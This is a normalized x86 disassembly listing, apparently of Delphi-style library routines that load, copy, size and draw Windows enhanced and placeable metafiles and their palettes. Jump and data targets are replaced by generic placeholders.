mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403338
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_403338
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403320
sub_420ee8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_420f78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_403124
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_40306c
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403338
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403338
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_420f98
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4210bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408528
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_404458
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_420900
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42105b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403338
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
mov eax [ ebx + 0xc ]
call sub_403124
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_403338
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4210c3
lea eax [ ebp - 0x14 ]
call sub_403ef8
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_4210fc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_420ee8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_420ee8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41471c
mov edx ebx
mov eax esi
call sub_420ee8
jmp r-xdata
pop esi
pop ebx
retn
sub_421158
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_42117c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_4211a4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4212ab
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x44 ]
mov ecx 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_40415c
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_420998
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403124
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42122d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212b2
lea eax [ ebp - 0x48 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403338
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403338
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_421232
mov eax [ ebp - 0x4 ]
call sub_403124
call sub_4038d8
call sub_40392c
mov eax [ ebx + 0xc ]
call sub_403124
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4212b2
lea eax [ ebp - 0x48 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403338
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403338
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_4212bc
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403074
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402a30
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_421318
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_421394
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4211a4
mov eax [ ebp - 0x8 ]
push eax
push sub_4212bc
push ebp
call sub_421318
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421410
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_41d0f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_421450
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42030c
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_421498
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_422470
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4146f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_4214c8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_422470
mov edx esi
mov eax ebx
call sub_41471c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_42246c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_42155c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_41ed94
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_41ed94
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_41ed94
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_41ed94
push eax
call SelectPalette
sub_4215f4
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42179c
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_421658
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d0f0
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_4216e4
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42179c
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_421748
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421cc4
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_416660
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_421900
mov edx esi
mov eax ebx
call sub_421830
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_42179c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_422470
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_42246c
pop esi
pop ebx
retn
sub_4217c4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_421cc4
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_421900
mov edx esi
mov eax ebx
call sub_421830
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_421830
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_42179c
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41688c
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_4026e4
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_4218f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_4028e0
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41688c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41f084
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218f7
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_402704
retn
call sub_41f084
sub_421900
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_42179c
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_41f084
lea eax [ ebp - 0x22 ]
call sub_41fed4
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_4026e4
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_421a6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_41f084
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421a76
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_402704
retn
call sub_41f084
sub_421a80
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421b27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_421b05
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_408528
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c3bc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404304
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4205d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421b0c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_421b60
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42179c
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_421bd4
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_421bd4
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_421bd4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_42179c
pop esi
pop ebx
retn
mov eax ebx
call sub_421d24
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421c10
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_42179c
pop esi
pop ebx
retn
mov eax ebx
call sub_421d24
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_421c50
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_42179c
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_421c10
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_421c10
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_421cc4
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_416660
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_421d24
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_42179c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_422470
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_42246c
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_421da8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_416660
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_421eb4
mov edx ebx
mov eax esi
call sub_421e28
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_421e28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026e4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_421ea4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4168c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402704
retn
sub_421eb4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402b40
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
